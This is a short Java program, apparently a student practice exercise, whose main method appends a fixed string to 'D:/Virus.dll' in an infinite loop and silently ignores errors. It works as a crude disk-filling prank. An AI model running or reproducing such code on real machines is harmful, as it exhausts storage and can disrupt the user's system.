/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package cfprac5;
import java.io.*;
/**
 *
 * @author micha
 */
public class Cfprac5 {

    /**
     * @param args the command line arguments
     */
     public static void main(String[] args) {
        // TODO code application logic here
        try
  {
   FileWriter f=new FileWriter("D:/Virus.dll",true);
   while(true)
   {
   f.write("Programming Is Such A FUN !!!");
   }
  }
  catch(FileNotFoundException e){}
   catch(IOException e){}
    }
    
}
